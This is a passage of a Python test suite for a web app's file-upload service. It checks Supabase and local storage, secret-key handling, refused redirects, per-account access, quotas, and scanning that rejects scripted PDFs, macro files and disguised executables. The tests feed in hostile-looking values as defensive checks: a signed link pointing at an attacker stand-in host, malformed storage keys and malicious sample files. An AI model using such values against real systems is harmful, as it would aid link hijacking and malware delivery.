                                 "u7/00000000-0000-4000-8000-000000000001/extra", "",
                                 "u7/00000000-0000-4000-8000-000000000001\n", None])
def test_a_store_only_touches_names_shaped_like_an_upload(tmp_path, key):
    for found in (stores.LocalFiles(tmp_path), stores.SupabaseFiles("https://x.supabase.co", "k", "uploads")):
        with pytest.raises(stores.StorageError):
            found.delete([key])
        with pytest.raises(stores.StorageError):
            found.download_url(key, "a.pdf", 60)
        with pytest.raises(stores.StorageError):
            found.put(key, tmp_path / "x", "application/pdf")


class FakeSupabase:
    """Answers Supabase Storage's REST calls, and records them."""

    def __init__(self, bucket=None):
        self.bucket = bucket
        self.calls = []
        self.stored = {}

    def __call__(self, request, timeout=None):
        raw = request.data.read() if hasattr(request.data, "read") else request.data
        path = request.full_url.split("/storage/v1", 1)[1]
        headers = {k.lower(): v for k, v in request.header_items()}
        is_json = headers.get("content-type") == "application/json"
        body = json.loads(raw) if raw and is_json else raw
        self.calls.append((request.get_method(), path, body, headers))
        answer = self.answer(request.get_method(), path, body)
        if isinstance(answer, int):
            raise urllib.error.HTTPError(request.full_url, answer, "refused", {}, io.BytesIO(b"{}"))
        return io.BytesIO(answer if isinstance(answer, bytes) else json.dumps(answer).encode())

    def answer(self, method, path, body):
        if path.startswith("/bucket"):
            if method == "GET":
                return self.bucket if self.bucket is not None else 400
            self.bucket = {**(self.bucket or {}), **body}
            return {"name": "uploads"}
        if path.startswith("/object/sign/"):
            return {"signedURL": path + "?token=DOWN"}
        if path.startswith("/object/list/"):
            return [{"name": KEY.split("/")[1], "metadata": {"size": 1234}}] if body["prefix"] == "u7" else [
                {"name": "u7", "metadata": None}, {"name": "backups", "metadata": None}]
        if method == "POST" and path.startswith("/object/uploads/"):
            if path in self.stored:
                return 400
            self.stored[path] = body
            return {"Key": path}
        if method == "GET" and path.startswith("/object/uploads/"):
            return self.stored.get(path, 404)
        return {}


SECRET = "sb_secret_never_in_an_address"


def test_supabase_makes_the_bucket_private_with_the_rules_limits_then_stores_and_signs(tmp_path):
    fake = FakeSupabase()
    found = stores.SupabaseFiles("https://abc.supabase.co/", SECRET, "uploads", opener=fake)
    source = tmp_path / "source"
    source.write_bytes(b"%PDF-bytes")
    found.put(KEY, source, "application/pdf")
    created = next(body for method, path, body, _ in fake.calls if (method, path) == ("POST", "/bucket"))
    assert created["public"] is False and created["file_size_limit"] == rules.MAX_FILE_BYTES
    assert sorted(created["allowed_mime_types"]) == sorted(k.content_type for k in rules.KINDS.values())
    method, path, body, headers = fake.calls[-1]
    assert (method, path, body) == ("POST", f"/object/uploads/{KEY}", b"%PDF-bytes")
    assert (headers["content-type"], headers["content-length"], headers["x-upsert"]) == ("application/pdf", "10", "false")
    with pytest.raises(stores.StorageError):
        found.put(KEY, source, "application/pdf")              # never over an object already there
    target = tmp_path / "back"
    assert found.fetch(KEY, target, 100) == 10 and target.read_bytes() == b"%PDF-bytes"
    with pytest.raises(stores.TooLarge):
        found.fetch(KEY, target, 5)
    url = found.download_url(KEY, "Annual report & co.pdf", 60)
    assert url == (f"https://abc.supabase.co/storage/v1/object/sign/uploads/{KEY}?token=DOWN"
                   "&download=Annual%20report%20%26%20co.pdf")
    assert fake.calls[-1][2] == {"expiresIn": 60}
    assert found.size(KEY) == 1234
    assert [o.key for o in found.objects()] == [KEY]           # other folders are not ours to list
    # The key travels in headers only; the bucket is checked once
    assert all(SECRET not in path and headers["authorization"] == f"Bearer {SECRET}"
               for _, path, _, headers in fake.calls)
    assert SECRET not in url
    assert sum(path.startswith("/bucket") for _, path, _, _ in fake.calls) == 2


def test_supabase_puts_a_public_bucket_right_and_never_quotes_the_key_in_an_error():
    fake = FakeSupabase({"public": True, "file_size_limit": None, "allowed_mime_types": None})
    found = stores.SupabaseFiles("https://abc.supabase.co", SECRET, "uploads", opener=fake)
    found.ensure_bucket()
    assert fake.bucket["public"] is False and fake.bucket["file_size_limit"] == rules.MAX_FILE_BYTES

    def refuse(request, timeout=None):
        raise urllib.error.HTTPError(request.full_url, 500, f"bad key {SECRET}", {}, io.BytesIO(SECRET.encode()))
    broken = stores.SupabaseFiles("https://abc.supabase.co", SECRET, "uploads", opener=refuse)
    with pytest.raises(stores.StorageError) as failed:
        broken.download_url(KEY, "a.pdf", 60)
    assert SECRET not in str(failed.value)
    with pytest.raises(stores.StorageError):
        stores.SupabaseFiles("http://abc.supabase.co", SECRET, "uploads")


def test_the_key_never_follows_a_redirect():
    """The key is in the request's headers: a store that answers "look over
    there" is an error, not somewhere to send it."""
    request = urllib.request.Request("https://abc.supabase.co/storage/v1/bucket/uploads")
    handler = stores._NoRedirects()
    assert handler.redirect_request(request, None, 302, "Found", {}, "https://elsewhere.example/") is None
    assert any(isinstance(h, stores._NoRedirects) for h in stores._open.__self__.handlers)
    assert stores.SupabaseFiles("https://abc.supabase.co", SECRET, "uploads")._opener is stores._open


@pytest.mark.parametrize("answer", [{}, {"signedURL": "https://evil.example/x?token=1"}, {"signedURL": 7}, [],
                                    {"signedURL": "/object/sign/uploads/x"}])
def test_a_signed_link_supabase_did_not_shape_as_one_is_not_handed_on(answer):
    class Odd(FakeSupabase):
        def answer(self, method, path, body):
            return answer if "/sign/" in path else super().answer(method, path, body)
    found = stores.SupabaseFiles("https://abc.supabase.co", SECRET, "uploads", opener=Odd())
    with pytest.raises(stores.StorageError):
        found.download_url(KEY, "a.pdf", 60)


def test_which_store_follows_the_environment(monkeypatch, tmp_path):
    for name in ("SUPABASE_UPLOADS_URL", "SUPABASE_UPLOADS_KEY", "SUPABASE_UPLOADS_BUCKET", "FSE_UPLOADS_DIR"):
        monkeypatch.delenv(name, raising=False)
    assert stores.get_store() is None
    monkeypatch.setenv("FSE_UPLOADS_DIR", str(tmp_path))
    assert isinstance(stores.get_store(), stores.LocalFiles)
    monkeypatch.setenv("FSE_ENV", "production")          # never a directory in production
    assert stores.get_store() is None and stores.local_store() is None
    monkeypatch.setenv("SUPABASE_UPLOADS_URL", "https://abc.supabase.co")
    monkeypatch.setenv("SUPABASE_UPLOADS_KEY", SECRET)
    assert (stores.get_store().name, stores.get_store().bucket) == ("supabase", "uploads")
    monkeypatch.setenv("FSE_ENV", "staging")
    assert stores.get_store().bucket == "uploads-staging"


# ---------------------------------------------------------------------------
# The endpoints, on a real database and a real (directory) store
# ---------------------------------------------------------------------------
ALICE, BOB = "test:alice", "test:bob"
NOBODY = "00000000-0000-4000-8000-000000000000"


@pytest.fixture
def uploads(fresh_db, tmp_path, monkeypatch):
    """A database, a directory store, a spool of its own, and
    ``sign_in(subject)`` to switch caller. The scan runs in this process
    (the child process has its own tests above, and one below)."""
    for name in ("SUPABASE_UPLOADS_URL", "SUPABASE_UPLOADS_KEY", "FSE_UPLOADS_BUDGET_MB"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("FSE_UPLOADS_DIR", str(tmp_path / "store"))
    (tmp_path / "spool").mkdir()
    monkeypatch.setattr(service, "spool", lambda: tmp_path / "spool")
    monkeypatch.setattr(service, "scan_path", lambda path, kind: scan(path.read_bytes(), kind))
    stores.reset()
    previous = app.dependency_overrides.get(require_user)

    def sign_in(subject: str):
        app.dependency_overrides[require_user] = lambda: AuthUser(subject=subject)
        if client.get("/api/account").json().get("profile") is None:
            assert client.post("/api/account", json=PROFILE).status_code == 200
    sign_in(ALICE)
    yield sign_in
    app.dependency_overrides[require_user] = previous
    stores.reset()


def begin(name: str, size: int) -> dict:
    begun = client.post("/api/files", json={"name": name, "size": size})
    assert begun.status_code == 201, begun.text
    return begun.json()


def send(name: str, data: bytes, *, declared: int | None = None):
    """Reserve room and send the bytes; the reserved file and the answer to the bytes."""
    file = begin(name, len(data) if declared is None else declared)
    return file, client.put(f"/api/files/{file['id']}/content", content=data)


def run_scans(queue) -> int:
    runner, ran = Runner(lambda: queue), 0
    while runner.run_next() is not None:
        ran += 1
    return ran


def upload(queue, name: str, data: bytes) -> dict:
    """The whole road: reserve, send, scan. The file as it ends up."""
    file, sent = send(name, data)
    assert sent.status_code == 200, sent.text
    run_scans(queue)
    return client.get(f"/api/files/{file['id']}").json()


def stored(tmp_path) -> list:
    return sorted(p.name for p in (tmp_path / "store").glob("u*/*"))


def spooled(tmp_path) -> list:
    return sorted(p.name for p in (tmp_path / "spool").iterdir())


def audit_actions() -> list:
    with db_engine.connect() as conn:
        return [r.action for r in conn.execute(select(AuditEvent.action).order_by(AuditEvent.id))]


def test_a_file_goes_up_is_scanned_and_comes_back_byte_for_byte(uploads, job_queue, tmp_path):
    data = s.pdf(padding=3 * MB)                     # three times what any other request may carry
    file, sent = send("Annual report 2025.pdf", data)
    assert (file["status"], file["kind"], file["size"]) == ("pending", "pdf", len(data))
    assert sent.status_code == 200 and sent.json()["status"] == "scanning"
    # Not downloadable before it is checked
    refused = client.post(f"/api/files/{file['id']}/link")
    assert (refused.status_code, refused.json()["detail"]["code"]) == (409, "not_ready")
    assert run_scans(job_queue) == 1
    listed = client.get("/api/files").json()
    assert listed["enabled"] is True
    assert [(f["name"], f["status"], f["reason"]) for f in listed["files"]] == [
        ("Annual report 2025.pdf", "clean", None)]
    assert listed["usage"]["bytes"] == len(data) and listed["usage"]["files"] == 1
    link = client.post(f"/api/files/{file['id']}/link")
    assert link.status_code == 200 and link.json()["expires_in"] == rules.LINK_S
    assert link.headers["cache-control"] == "no-store"
    app.dependency_overrides.pop(require_user)       # the link needs no session, as a signed link doesn't
    back = client.get(link.json()["url"])
    assert back.status_code == 200 and back.content == data
    assert "attachment" in back.headers["content-disposition"]
    assert "Annual%20report%202025.pdf" in back.headers["content-disposition"]
    assert client.get(link.json()["url"] + "x").status_code == 403
    assert spooled(tmp_path) == []                   # nothing of the upload is left on the server's disk


def test_the_real_scan_runs_in_its_own_process_from_the_spooled_copy(uploads, job_queue, tmp_path, monkeypatch):
    monkeypatch.setattr(service, "scan_path", scanner.scan_path)
    fetched = []
    monkeypatch.setattr(stores.LocalFiles, "fetch", lambda self, *a: fetched.append(a))
    assert upload(job_queue, "report.pdf", s.pdf())["status"] == "clean"
    assert upload(job_queue, "scripted.pdf", s.pdf(s.JAVASCRIPT))["reason"] == "active_content"
    assert fetched == []                             # the copy the upload left is scanned: no download from the store


def test_a_scan_on_another_machine_fetches_the_file_from_the_store(uploads, job_queue, tmp_path):
    file, _ = send("report.pdf", s.pdf(s.JAVASCRIPT))
    for path in (tmp_path / "spool").iterdir():
        path.unlink()                                # as after a restart, or in a separate worker
    run_scans(job_queue)
    assert client.get(f"/api/files/{file['id']}").json()["reason"] == "active_content"
    assert spooled(tmp_path) == [] and stored(tmp_path) == []


def test_every_accepted_kind_can_be_uploaded(uploads, job_queue):
    files = {"a.pdf": s.pdf(), "b.xlsx": s.open_xml("xlsx"), "c.docx": s.open_xml("docx"),
             "e.doc": s.word_binary()}
    with open(sorted(glob.glob("tests/fixtures/benchmarks/damodaran/*.xls"))[0], "rb") as source:
        files["d.xls"] = source.read()
    for name, data in files.items():
        assert upload(job_queue, name, data)["status"] == "clean", name
    assert client.get("/api/files").json()["kinds"] == ["pdf", "xlsx", "docx", "xls", "doc"]


def test_another_account_cannot_see_send_fetch_or_delete_the_file(uploads, job_queue, tmp_path):
    file = upload(job_queue, "private.pdf", s.pdf())
    waiting = begin("waiting.pdf", 100)
    assert file["status"] == "clean"
    uploads(BOB)
    assert client.get("/api/files").json()["files"] == []
    for method, path in (("GET", ""), ("PUT", "/content"), ("POST", "/link"), ("DELETE", "")):
        for target in (file["id"], waiting["id"]):
            answer = client.request(method, f"/api/files/{target}{path}", content=b"%PDF-")
            assert answer.status_code == 404, (method, path)
            # ... exactly as for a file that does not exist
            assert answer.json() == client.request(method, f"/api/files/{NOBODY}{path}", content=b"%PDF-").json()
    assert len(stored(tmp_path)) == 1 and spooled(tmp_path) == []
    uploads(ALICE)
    assert client.post(f"/api/files/{file['id']}/link").status_code == 200
    assert client.get(f"/api/files/{waiting['id']}").json()["status"] == "pending"


def test_nobody_can_queue_a_scan_and_scans_are_not_among_a_persons_runs(uploads, job_queue):
    file, _ = send("mine.pdf", s.pdf())
    # A scan is the system's job: a caller can't queue one for any file
    asked = client.post("/api/jobs", json={"kind": "upload.scan", "input": {"file_id": file["id"]}})
    assert asked.status_code == 422
    assert client.get("/api/jobs").json()["jobs"] == []
    assert job_queue.counts()["queued"] == 1


@pytest.mark.parametrize("name, build, reason", [
    ("model.xlsx", lambda: s.open_xml("xlsx", {"xl/vbaProject.bin": s.OLE_MAGIC + b"\0" * 600}), "macros"),
    ("report.pdf", lambda: s.pdf(s.JAVASCRIPT), "active_content"),
    ("report.pdf", lambda: b"MZ\x90\x00" + b"\0" * 2000, "wrong_type"),
    ("memo.docx", lambda: s.open_xml("xlsx"), "wrong_type"),
    ("memo.doc", lambda: s.word_binary(s.MACRO_PROJECT), "macros"),
])
def test_a_bad_file_is_refused_and_its_bytes_deleted(uploads, job_queue, tmp_path, name, build, reason):
    file = upload(job_queue, name, build())
    assert (file["status"], file["reason"]) == ("refused", reason)
    assert stored(tmp_path) == [] and spooled(tmp_path) == []
    link = client.post(f"/api/files/{file['id']}/link")
    assert (link.status_code, link.json()["detail"]["code"]) == (409, "not_ready")
    # A refused file's bytes are gone, so it no longer counts against the quota
    assert client.get("/api/files").json()["usage"]["bytes"] == 0


def test_an_oversized_or_unaccepted_file_is_refused_before_a_byte_is_sent(uploads):
    for body, status, code in (
            ({"name": "big.pdf", "size": rules.MAX_FILE_BYTES + 1}, 413, "too_large"),
            ({"name": "empty.pdf", "size": 0}, 422, "empty"),
            ({"name": "tool.exe", "size": 10}, 422, "bad_type"),
            ({"name": "model.xlsm", "size": 10}, 422, "bad_type"),
            ({"name": "report.pdf.exe", "size": 10}, 422, "bad_type"),
            ({"name": ".pdf", "size": 10}, 422, "bad_name")):
        answer = client.post("/api/files", json=body)
        assert (answer.status_code, answer.json()["detail"]["code"]) == (status, code), body
        assert answer.json()["detail"]["message"]
    assert client.post("/api/files", json={"name": "a.pdf", "size": rules.MAX_FILE_BYTES}).status_code == 201
    assert client.post("/api/files", json={"name": "a.pdf", "size": 5, "owner": BOB}).status_code == 422


def test_more_bytes_than_were_declared_are_cut_off_and_refused(uploads, job_queue, tmp_path):
    """The declared size is what the quota counted, so the bytes are counted
    as they arrive and nothing past it is kept."""
    file, sent = send("report.pdf", s.pdf(padding=50_000), declared=1000)
    assert (sent.status_code, sent.json()["detail"]["code"]) == (413, "too_large")
    after = client.get(f"/api/files/{file['id']}").json()
    assert (after["status"], after["reason"]) == ("refused", "too_large")
    assert stored(tmp_path) == [] and spooled(tmp_path) == [] and job_queue.counts()["queued"] == 0
    # ... and so is nothing at all
    file, sent = send("report.pdf", b"", declared=10)
    assert (sent.status_code, sent.json()["detail"]["code"]) == (422, "empty")
    assert client.get(f"/api/files/{file['id']}").json()["reason"] == "empty"
    # Fewer than declared is fine: what arrived is what counts
    file, sent = send("report.pdf", s.pdf(), declared=5000)
    assert sent.status_code == 200 and sent.json()["size"] == len(s.pdf())


def test_a_request_past_the_file_limit_is_refused_before_it_is_read(uploads):
    file = begin("report.pdf", rules.MAX_FILE_BYTES)
    declared = client.put(f"/api/files/{file['id']}/content", content=b"x",
                          headers={"Content-Length": str(rules.MAX_FILE_BYTES + 1)})
    assert declared.status_code == 413
    # Only a file's own bytes may be large: every other request still stops at 1 MB
    assert limits.streams_body("PUT", f"/api/files/{file['id']}/content")
    for method, path in (("POST", f"/api/files/{file['id']}/content"), ("PUT", "/api/files/x/content"),
                         ("PUT", f"/api/files/{file['id']}/content/more"), ("PUT", f"/api/deals/{file['id']}/content")):
        assert not limits.streams_body(method, path)
    big = client.post("/api/files", content=b"{" + b" " * limits.MAX_BODY_BYTES + b"}",
                      headers={"Content-Type": "application/json"})
    assert big.status_code == 413


def test_bytes_are_only_taken_for_a_signed_in_callers_own_waiting_file(uploads, job_queue, tmp_path, signed_out):
    assert client.put(f"/api/files/{NOBODY}/content", content=b"x" * 5000).status_code == 401
    assert spooled(tmp_path) == []


def test_a_files_bytes_arrive_once(uploads, job_queue, tmp_path):
    file, sent = send("report.pdf", s.pdf())
    again = client.put(f"/api/files/{file['id']}/content", content=s.pdf(s.JAVASCRIPT))
    assert (again.status_code, again.json()["detail"]["code"]) == (409, "not_expected")
    assert run_scans(job_queue) == 1 and audit_actions() == ["file_uploaded"]
    clean = client.get(f"/api/files/{file['id']}").json()
    assert clean["status"] == "clean"
    # ... and not after the scan either: what was scanned is what stays stored
    assert client.put(f"/api/files/{file['id']}/content", content=s.pdf(s.JAVASCRIPT)).status_code == 409
    link = client.post(f"/api/files/{file['id']}/link").json()["url"]
    assert client.get(link).content == s.pdf()


def test_two_requests_sending_the_same_file_store_one_and_scan_what_was_stored(uploads, job_queue, tmp_path):
    """Each request writes a spool file of its own; a name is stored once, so
    the second request fails at the store and its bytes are dropped."""
    file = begin("report.pdf", 5000)
    record = service.expecting(ALICE, uuid.UUID(file["id"]))
    first, second = service.arriving(record.id), service.arriving(record.id)
    assert first != second
    first.write_bytes(s.pdf())
    second.write_bytes(s.pdf(s.JAVASCRIPT))
    service.arrived(ALICE, record, first, len(s.pdf()))
    with pytest.raises(stores.StorageError):
        service.arrived(ALICE, record, second, len(s.pdf(s.JAVASCRIPT)))
    assert spooled(tmp_path) == [file["id"]]
    run_scans(job_queue)
    assert client.get(f"/api/files/{file['id']}").json()["status"] == "clean"


def test_a_file_deleted_while_its_bytes_were_being_stored_leaves_none_behind(uploads, job_queue, tmp_path, monkeypatch):
    """(The second review.) The bytes were stored and then their row was
    gone: bytes with no row are in nobody's quota, so they must not stay."""
    file = begin("report.pdf", 5000)
    put = stores.LocalFiles.put

    def deleted_meanwhile(self, key, source, content_type=""):
        put(self, key, source, content_type)
        rows.delete_file(ALICE, uuid.UUID(file["id"]))
    monkeypatch.setattr(stores.LocalFiles, "put", deleted_meanwhile)
    answer = client.put(f"/api/files/{file['id']}/content", content=s.pdf())
    assert answer.status_code == 404
    assert stored(tmp_path) == [] and spooled(tmp_path) == [] and job_queue.counts()["queued"] == 0
    assert client.get("/api/files").json()["usage"]["files"] == 0


def test_an_upload_that_goes_quiet_times_out(uploads, tmp_path, monkeypatch):
    import asyncio
    from api.routers import files as router

    class Quiet:
        def stream(self):
            async def body():
                yield b"%PDF-"
                await asyncio.sleep(30)
            return body()
    monkeypatch.setattr(rules, "ARRIVE_IDLE_S", 0.05)
    with pytest.raises(TimeoutError):
        asyncio.run(router._spool(Quiet(), tmp_path / "part", 1000))


def test_the_servers_disk_keeps_only_so_many_uploads_for_their_scans(uploads, job_queue, tmp_path, monkeypatch):
    monkeypatch.setattr(rules, "SPOOL_MAX_BYTES", 100)
    file, sent = send("report.pdf", s.pdf(s.JAVASCRIPT))
    assert sent.status_code == 200 and spooled(tmp_path) == []      # not kept: the scan fetches it from the store
    run_scans(job_queue)
    assert client.get(f"/api/files/{file['id']}").json()["reason"] == "active_content"


def test_room_reserved_but_never_used_has_a_limit_of_its_own(uploads, monkeypatch):
    """A few accounts reserving the largest size and sending nothing must not
    use up the store for everyone."""
    monkeypatch.setattr(rules, "PENDING_BUDGET_BYTES", 1500)
    begin("a.pdf", 1000)
    uploads(BOB)
    refused = client.post("/api/files", json={"name": "b.pdf", "size": 501})
    assert (refused.status_code, refused.json()["detail"]["code"]) == (503, "busy")
    assert client.post("/api/files", json={"name": "b.pdf", "size": 500}).status_code == 201


def test_the_server_takes_in_only_so_many_uploads_at_once(uploads, monkeypatch):
    from api.routers import files as router
    file = begin("report.pdf", 5000)
    held = [router._arriving.acquire(blocking=False) for _ in range(rules.MAX_ARRIVING)]
    try:
        busy = client.put(f"/api/files/{file['id']}/content", content=s.pdf())
        assert (busy.status_code, busy.json()["detail"]["code"]) == (503, "busy")
        assert busy.headers["retry-after"] == "5"
    finally:
        for _ in held:
            router._arriving.release()
    assert client.put(f"/api/files/{file['id']}/content", content=s.pdf()).status_code == 200


def test_an_upload_that_stalls_gives_its_place_back(uploads, job_queue, tmp_path, monkeypatch):
    """A connection that sends a little and then nothing must not hold one of
    the server's two places for good."""
    import asyncio
    from api.routers import files as router

    async def stalled(request, path, limit):
        path.write_bytes(b"%PDF-")
        await asyncio.sleep(30)
    monkeypatch.setattr(rules, "ARRIVE_TIMEOUT_S", 0.05)
    file = begin("report.pdf", 5000)
    with monkeypatch.context() as slow:
        slow.setattr(router, "_spool", stalled)
        answer = client.put(f"/api/files/{file['id']}/content", content=s.pdf())
        assert (answer.status_code, answer.json()["detail"]["code"]) == (408, "too_slow")
    assert spooled(tmp_path) == [] and router._arriving.acquire(blocking=False) and router._arriving.acquire(blocking=False)
    router._arriving.release()
    router._arriving.release()
    # The room is still the caller's, and the file can be sent again
    assert client.put(f"/api/files/{file['id']}/content", content=s.pdf()).status_code == 200


def test_the_quota_warns_near_the_limit_then_refuses(uploads, job_queue, monkeypatch):
    monkeypatch.setattr(rules, "USER_QUOTA_BYTES", 10_000)
    assert upload(job_queue, "one.pdf", s.pdf(padding=3_000))["status"] == "clean"
    assert client.get("/api/files").json()["usage"]["near_limit"] is False
    second = upload(job_queue, "two.pdf", s.pdf(padding=4_000))
    usage = client.get("/api/files").json()["usage"]
    assert (usage["near_limit"], usage["full"], usage["quota_bytes"]) == (True, False, 10_000)
    assert 8_000 <= usage["bytes"] < 10_000
    refused = client.post("/api/files", json={"name": "three.pdf", "size": 10_000 - usage["bytes"] + 1})
    assert (refused.status_code, refused.json()["detail"]["code"]) == (409, "quota_bytes")
    # Exactly the room that is left is still accepted, and deleting frees room
    assert client.post("/api/files", json={"name": "fits.pdf", "size": 10_000 - usage["bytes"]}).status_code == 201
    assert client.delete(f"/api/files/{second['id']}").status_code == 204
    assert client.get("/api/files").json()["usage"]["near_limit"] is False


def test_the_file_count_has_a_limit_too(uploads, job_queue, monkeypatch):
    monkeypatch.setattr(rules, "USER_MAX_FILES", 3)
    for n in range(3):
        assert upload(job_queue, f"{n}.pdf", s.pdf())["status"] == "clean"
    refused = client.post("/api/files", json={"name": "4.pdf", "size": 10})
    assert (refused.status_code, refused.json()["detail"]["code"]) == (409, "quota_files")
    assert client.get("/api/files").json()["usage"]["full"] is True


def test_only_a_few_of_a_persons_files_may_be_on_their_way_or_being_checked_at_once(uploads, job_queue):
    """Room reserved counts at once, and nobody can queue a pile of scans
    for everyone else's to wait behind."""
    sent = [send(f"{n}.pdf", s.pdf())[0] for n in range(rules.MAX_IN_FLIGHT - 1)]
    waiting = begin("waiting.pdf", 100)
    refused = client.post("/api/files", json={"name": "more.pdf", "size": 100})
    assert (refused.status_code, refused.json()["detail"]["code"]) == (429, "in_flight")
    assert client.get("/api/files").json()["usage"]["files"] == rules.MAX_IN_FLIGHT     # the reservation counts
    uploads(BOB)
    assert client.post("/api/files", json={"name": "bobs.pdf", "size": 100}).status_code == 201   # not Bob's problem
    uploads(ALICE)
    run_scans(job_queue)
    assert client.post("/api/files", json={"name": "more.pdf", "size": 100}).status_code == 201
    assert {f["id"] for f in client.get("/api/files").json()["files"]} >= {f["id"] for f in sent} | {waiting["id"]}


def test_one_accounts_quota_is_not_anothers_but_the_store_is_shared(uploads, monkeypatch):
    monkeypatch.setattr(rules, "USER_QUOTA_BYTES", 1000)
    assert client.post("/api/files", json={"name": "a.pdf", "size": 1000}).status_code == 201
    uploads(BOB)
    assert client.post("/api/files", json={"name": "b.pdf", "size": 1000}).status_code == 201
    monkeypatch.setattr(rules, "total_budget_bytes", lambda environ=None: 2500)
    assert client.post("/api/files", json={"name": "c.pdf", "size": 400}).status_code == 409   # Bob's own quota
    monkeypatch.setattr(rules, "USER_QUOTA_BYTES", 5000)
    full = client.post("/api/files", json={"name": "c.pdf", "size": 501})
    assert (full.status_code, full.json()["detail"]["code"]) == (507, "storage_full")
    assert client.post("/api/files", json={"name": "c.pdf", "size": 500}).status_code == 201


def test_room_past_its_time_counts_until_its_bytes_are_gone_and_is_cleared_by_the_next_upload(
        uploads, job_queue, tmp_path):
    """(The security review's quota gap.) A row past its time no longer shows,
    but its bytes are in the store until they are deleted, so it counts until
    then; the owner's next upload deletes both."""
    old = upload(job_queue, "old.pdf", s.pdf(padding=2000))
    with db_engine.transaction() as conn:
        conn.execute(StoredFile.__table__.update().values(expires_at=utc_now() - timedelta(minutes=1)))
    listed = client.get("/api/files").json()
    assert listed["files"] == [] and listed["usage"]["bytes"] == old["size"] and len(stored(tmp_path)) == 1
    assert rows.totals()["bytes"] == old["size"]
    begin("new.pdf", 100)
    assert stored(tmp_path) == [] and client.get("/api/files").json()["usage"] == {
        **listed["usage"], "bytes": 100, "files": 1}


def test_uploads_started_are_limited_per_hour(uploads, monkeypatch):
    monkeypatch.setattr(limits, "USER_UPLOADS", limits.Rule("user_uploads_per_hour", "uploads", "user", 2, 3600))
    for _ in range(2):
        file = begin("a.pdf", 10)
        client.delete(f"/api/files/{file['id']}")
    refused = client.post("/api/files", json={"name": "a.pdf", "size": 10})
    assert refused.status_code == 429 and "uploads" in refused.json()["detail"]
    assert client.get("/api/files").status_code == 200          # looking is not uploading


def test_deleting_removes_the_row_and_the_bytes_and_is_recorded(uploads, job_queue, tmp_path):
    file = upload(job_queue, "report.pdf", s.pdf())
    assert len(stored(tmp_path)) == 1
    assert client.delete(f"/api/files/{file['id']}").status_code == 204
    assert stored(tmp_path) == [] and client.get("/api/files").json()["files"] == []
    assert client.get(f"/api/files/{file['id']}").status_code == 404
    assert client.delete(f"/api/files/{file['id']}").status_code == 404
    with db_engine.connect() as conn:
        entries = conn.execute(select(AuditEvent.action, AuditEvent.detail, AuditEvent.deal_id)
                               .order_by(AuditEvent.id)).all()
    # One entry per action, and nothing of the file in either
    assert [tuple(e) for e in entries] == [("file_uploaded", {}, None), ("file_deleted", {}, None)]
    history = client.get("/api/account/history").json()["entries"]
    assert [e["action"] for e in history] == ["file_deleted", "file_uploaded"]


def test_a_file_deleted_while_it_is_scanned_leaves_nothing_behind(uploads, job_queue, tmp_path):
    file, _ = send("report.pdf", s.pdf())
    assert client.delete(f"/api/files/{file['id']}").status_code == 204
    assert run_scans(job_queue) == 1
    assert stored(tmp_path) == [] and spooled(tmp_path) == []
    with db_engine.connect() as conn:
        assert conn.execute(select(StoredFile.id)).all() == []


def test_a_full_scan_queue_keeps_the_file_waiting_and_queues_it_when_its_owner_looks(
        uploads, job_queue, monkeypatch):
    monkeypatch.setattr(service, "MAX_SCANS_QUEUED", 1)
    (first, sent_first), (second, sent_second) = send("a.pdf", s.pdf()), send("b.pdf", s.pdf())
    # No room in the queue is not the caller's problem: the file is in, and waits
    assert (sent_first.json()["status"], sent_second.json()["status"]) == ("scanning", "scanning")
    assert job_queue.counts()["queued"] == 1
    assert run_scans(job_queue) == 1
    listed = {f["name"]: f["status"] for f in client.get("/api/files").json()["files"]}   # looking queues it
    assert listed == {"a.pdf": "clean", "b.pdf": "scanning"}
    assert run_scans(job_queue) == 1
    assert client.get(f"/api/files/{second['id']}").json()["status"] == "clean"
    assert audit_actions() == ["file_uploaded", "file_uploaded"]      # one entry an upload, whatever the queue did


def test_a_store_that_cannot_be_reached_during_a_scan_neither_passes_nor_refuses_the_file(
        uploads, job_queue, tmp_path, monkeypatch):
    """A file is refused for what is in it, never for an outage."""
    file, _ = send("report.pdf", s.pdf())
    for path in (tmp_path / "spool").iterdir():
        path.unlink()

    def unreachable(self, *args):
        raise stores.StorageError("storage could not be reached")
    with monkeypatch.context() as broken:
        broken.setattr(stores.LocalFiles, "fetch", unreachable)
        assert run_scans(job_queue) == 1
        assert client.post(f"/api/files/{file['id']}/link").json()["detail"]["code"] == "not_ready"
        assert len(stored(tmp_path)) == 1
    assert client.get(f"/api/files/{file['id']}").json()["status"] == "scanning"    # ... and looking queues it again
    assert run_scans(job_queue) == 1
    assert client.get(f"/api/files/{file['id']}").json()["status"] == "clean"


def test_a_scan_whose_job_was_lost_is_queued_again_once_it_is_overdue(uploads, job_queue):
    file, _ = send("report.pdf", s.pdf())
    job_queue.cancel(service.SCAN_OWNER, job_queue.list(service.SCAN_OWNER)[0].id)   # as a restart would lose it
    assert run_scans(job_queue) == 0
    client.get("/api/files")
    assert job_queue.counts()["queued"] == 0             # not yet overdue
    with db_engine.transaction() as conn:
        conn.execute(StoredFile.__table__.update().values(
            queued_at=utc_now() - timedelta(seconds=rules.RESCAN_AFTER_S + 1)))
    uploads(BOB)
    client.get("/api/files")
    assert job_queue.counts()["queued"] == 0             # another account's look queues nothing of Alice's
    uploads(ALICE)
    client.get("/api/files")
    client.get("/api/files")
    assert job_queue.counts()["queued"] == 1             # ... and two looks queue one scan
    run_scans(job_queue)
    assert client.get(f"/api/files/{file['id']}").json()["status"] == "clean"


def test_a_store_that_fails_never_leaves_a_wrong_answer(uploads, job_queue, tmp_path, monkeypatch):
    def unreachable(self, *args):
        raise stores.StorageError("storage could not be reached")
    file = begin("report.pdf", 5000)
    with monkeypatch.context() as broken:
        broken.setattr(stores.LocalFiles, "put", unreachable)
        answer = client.put(f"/api/files/{file['id']}/content", content=s.pdf())
        assert (answer.status_code, answer.json()["detail"]["code"]) == (503, "storage_unavailable")
        assert client.get(f"/api/files/{file['id']}").json()["status"] == "pending"
        assert spooled(tmp_path) == []
    assert client.put(f"/api/files/{file['id']}/content", content=s.pdf()).status_code == 200   # sent again
    run_scans(job_queue)
    # Deleted for its owner at once; the bytes a failed delete leaves are the sweep's
    with monkeypatch.context() as broken:
        broken.setattr(stores.LocalFiles, "delete", unreachable)
        assert client.delete(f"/api/files/{file['id']}").status_code == 204
        assert client.get("/api/files").json()["files"] == [] and len(stored(tmp_path)) == 1
    assert job_maintenance()["files_orphans_deleted"] == 1 and stored(tmp_path) == []


def test_the_nightly_sweep_applies_the_deletion_rules(uploads, job_queue, tmp_path):
    now = utc_now()
